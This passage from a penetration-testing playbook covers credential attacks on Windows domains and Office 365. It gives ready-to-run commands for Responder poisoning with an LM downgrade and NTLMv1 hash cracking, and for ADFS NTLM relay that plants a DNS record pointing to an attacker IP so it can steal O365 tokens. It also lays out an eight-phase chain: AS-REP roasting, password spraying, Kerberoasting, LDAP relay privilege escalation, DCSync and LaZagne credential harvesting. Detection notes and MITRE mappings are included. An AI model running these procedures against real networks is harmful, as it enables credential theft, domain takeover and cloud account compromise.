  -I $NETWORK_INTERFACE \
  -rdwv \
  --lm   # Force LM downgrade when possible
```

Step 4 - Crack NTLMv1 hashes locally (fixed challenge enables this):
```bash
# NTLMv1 with fixed challenge = mode 5500
hashcat -m 5500 \
  /opt/Responder/logs/NTLMv1-SSP-$TARGET.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule \
  -o $OUTPUT_DIR/ntlmv1-cracked.txt

# NTLMv1 is computationally easier than NTLMv2 - much higher success rate
```

**LmCompatibilityLevel Assessment:**

| Registry Value | NTLM Behavior | Downgrade Possible |
|---|---|---|
| 0 | Sends LM + NTLM | Yes - NTLMv1 exposed directly |
| 1 | NTLMv1 preferred | Yes |
| 2 | NTLMv1 only | Yes - best for downgrade |
| 3 | NTLMv2 preferred | Possible with Responder --lm flag |
| 4 | NTLMv2 required, v1 refused | No |
| 5 | NTLMv2 only | No |

**Detection:** Anomalous NTLM challenge values in network traffic (fixed 1122334455667788 is a known IOC). NTLMv1 auth events when NTLMv2 is expected (detected by MDI). Network monitoring for Responder-specific challenge patterns.

**MITRE ATT&CK:** T1557.001 (LLMNR/NBT-NS Poisoning), T1212 (Exploitation for Credential Access)

---

### 7.4 ADFS Relay to O365 and Cloud Services

**Objective:** Relay NTLM authentication from internal Windows hosts to the ADFS server, obtaining a cloud service authentication token without requiring user credentials or defeating MFA on internal networks.

**Prerequisites:** Network foothold, ability to receive NTLM authentication (DNS control, ARP position, or LLMNR poisoning), target organization using ADFS for O365 federation, ADFS server without Extended Protection for Authentication (EPA)

**Tools:**
- `ADFSRelay` (Praetorian, open-source)
- `NTLMParse` (Praetorian)
- `ntlmrelayx.py`

**Procedure:**

Step 1 - Identify ADFS infrastructure:
```bash
# Find ADFS hostname
nslookup -type=SRV _msdcs.$DOMAIN
dig SRV _msdcs.$DOMAIN

# Check federation metadata
curl -s "https://adfs.$DOMAIN/federationmetadata/2007-06/federationmetadata.xml" | \
  grep -i "EntityID\|endpoint"

# Verify ADFS WIA (Windows Integrated Authentication) endpoint
curl -v -k "https://adfs.$DOMAIN/adfs/ls/auth/integrated/"
```

Step 2 - Check ADFS has WIA endpoint (required for relay):
```bash
# The WIA endpoint uses MS-NTHT (NTLM over HTTP)
# It should return 401 with WWW-Authenticate: Negotiate/NTLM
curl -v -k "https://adfs.$DOMAIN/adfs/ls/?client-request-id=&pullStatus=0" 2>&1 | \
  grep -i "WWW-Authenticate\|401\|negotiate\|ntlm"
```

Step 3 - Set up intranet subdomain for automatic NTLM auth:
```bash
# Add DNS record in target domain (requires domain foothold with DNS write access)
dnstool.py \
  -u "$DOMAIN\\$USERNAME" \
  -p $PASSWORD \
  -r attacker.corp.local \
  -a add \
  -t A \
  -d $ATTACKER_IP \
  $DC_IP

# Windows browsers auto-authenticate to single-label hostnames or
# hostnames in the Intranet Zone with NTLM
# Victim visiting http://attacker will send NTLM automatically
```

Step 4 - Run ADFSRelay to capture and relay to ADFS:
```bash
# Start ADFSRelay listener
python3 ADFSRelay.py \
  --adfs "https://adfs.$DOMAIN/adfs/ls/auth/integrated/" \
  --resource "https://outlook.office365.com/" \
  --port 80 \
  --output $OUTPUT_DIR/adfs-tokens.json
```

Step 5 - Trigger victim to authenticate to attacker:
```bash
# Responder to catch any browsing NTLM auths
# Or social engineering to get victim to click internal link
# Or Cobalt Strike: execute-assembly InternalMonologue.exe
```

Step 6 - Use captured token to access O365:
```bash
# Validate token
curl -H "Authorization: Bearer $ADFS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me"

# Access Exchange/O365
curl -H "Authorization: Bearer $ADFS_TOKEN" \
  "https://outlook.office.com/api/v2.0/me/messages"
```

**Detection:** ADFS Event ID 412 (Application request AD FS token) from unusual source IP. O365 Security Center: risky sign-ins from unexpected IP. Conditional Access Policy violations. Network monitoring for ADFS WIA requests from non-domain hosts.

**MITRE ATT&CK:** T1557 (Adversary-in-the-Middle), T1550 (Use Alternate Authentication Material), T1078.004 (Cloud Accounts)

---

## Section 8: Operational Chaining Reference

### 8.1 Full Credential Attack Chain - Internal Network Assessment

```
Phase 1: Discovery
  naabu $TARGET_RANGE → fingerprintx --json → brutus --json (default creds)
  responder -I $INTERFACE -A (passive observation, 15 min)
  nmap -p 389,636 --script ldap-rootdse $DOMAIN → identify AD forest

Phase 2: No-Credential Attacks
  GetNPUsers.py "$DOMAIN/" -no-pass -dc-ip $DC_IP → AS-REP roast
  kerbrute userenum --dc $DC_IP -d $DOMAIN $USERLIST → valid users
  responder -I $INTERFACE -rdwv (active poisoning)

Phase 3: Hash Cracking (parallel with Phase 2)
  hashcat -m 18200 asrep-hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
  hashcat -m 5600 ntlmv2-hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

Phase 4: Credential Spraying (if hash cracking slow)
  kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt "Spring2026!" --delay 1000

Phase 5: With Domain Credentials
  GetUserSPNs.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP -request (Kerberoast)
  BloodHound.py -u $USERNAME -p $PASSWORD -d $DOMAIN -ns $DC_IP -c All
  crackmapexec smb $TARGET_RANGE -u $USERNAME -p $PASSWORD --shares --sessions

Phase 6: NTLM Relay (simultaneous with spray/capture)
  ntlmrelayx.py -t ldap://$DC_IP -smb2support --escalate-user $CONTROLLED_USER

Phase 7: Post-Compromise Harvest
  secretsdump.py "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc (DCSync)
  LaZagne.exe all (on compromised workstations)
  Invoke-SessionGopher -Thorough -AllDomain

Phase 8: Key Spray (with any SSH keys found)
  naabu $TARGET_RANGE -p 22 | fingerprintx --json | brutus -k found_key.pem --json
```

---

## Appendix A: MITRE ATT&CK Technique Mapping

| Technique ID | Technique Name | Section |
|---|---|---|
| T1110 | Brute Force | 1.1-1.5 |
| T1110.001 | Password Guessing | 1.1-1.5 |
| T1110.002 | Password Cracking | 4.1 |
| T1110.003 | Password Spraying | 3.1, 3.2 |
| T1110.004 | Credential Stuffing | 2.2 |
| T1078 | Valid Accounts | 1.1-1.5 |
| T1078.001 | Default Accounts | 1.2-1.5 |
| T1078.002 | Domain Accounts | 3.1 |
| T1078.004 | Cloud Accounts | 3.2, 6.1, 7.4 |
| T1552 | Unsecured Credentials | 1.1, 5.3, 6.3 |
| T1552.001 | Credentials in Files | 5.2, 5.3 |
| T1552.004 | Private Keys | 2.1, 2.2, 5.3 |
| T1552.005 | Cloud Instance Metadata API | 6.1 |
| T1555 | Credentials from Password Stores | 5.2 |
| T1555.003 | Credentials from Web Browsers | 5.1, 6.2 |
| T1558.003 | Kerberoasting | 4.1 |
| T1558.004 | AS-REP Roasting | 4.1 |
| T1528 | Steal Application Access Token | 6.3 |
| T1539 | Steal Web Session Cookie | 6.2 |
| T1557 | Adversary-in-the-Middle | 7.1-7.4 |
| T1557.001 | LLMNR/NBT-NS Poisoning | 7.1, 7.3 |
| T1187 | Forced Authentication | 7.2 |
| T1548 | Abuse Elevation Control Mechanism | 6.1 |
| T1550 | Use Alternate Authentication Material | 7.4 |
| T1021.004 | Remote Services: SSH | 2.1, 2.2 |
| T1012 | Query Registry | 5.2 |
| T1083 | File and Directory Discovery | 5.3 |
| T1003.008 | /etc/passwd and /etc/shadow | 5.3 |

---

## Appendix B: Tool Installation Reference

```bash
# Brutus (Go binary - single file)
go install github.com/praetorian-inc/brutus@latest

# Naabu (port scanner)
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# FingerprintX
go install github.com/praetorian-inc/fingerprintx/cmd/fingerprintx@latest

# Kerbrute
go install github.com/ropnop/kerbrute@latest

# Sprayhound
pip install sprayhound

# Impacket (Kerberoast, DCSync, NTLMRelay)
pip install impacket

# CrackMapExec / NetExec
pip install crackmapexec
# Or: pip install netexec

# Hashcat (ensure CUDA/OpenCL drivers installed)
apt install hashcat  # Kali
brew install hashcat # macOS

# Responder
git clone https://github.com/lgandx/Responder /opt/Responder

# LaZagne
git clone https://github.com/AlessandroZ/LaZagne
pip install -r LaZagne/requirements.txt

# SessionGopher (PowerShell - Windows)
# Download from: github.com/Arvanaghi/SessionGopher

# BloodHound Python ingestor
pip install bloodhound

# Certipy (ADCS attacks)
pip install certipy-ad

# ADFSRelay (Praetorian)
# github.com/praetorian-inc/ADFSRelay

# MSOLSpray (O365 spray)
git clone https://github.com/dafthack/MSOLSpray

# Trevorspray
pip install trevorspray

# o365spray
pip install o365spray
```

---

*Playbook Version 1.0 | ATHENA Knowledge System | 2026-02-26*
*For authorized penetration testing engagements only. Review rules of engagement before use.*
*Commands use placeholder variables - substitute actual values before execution.*
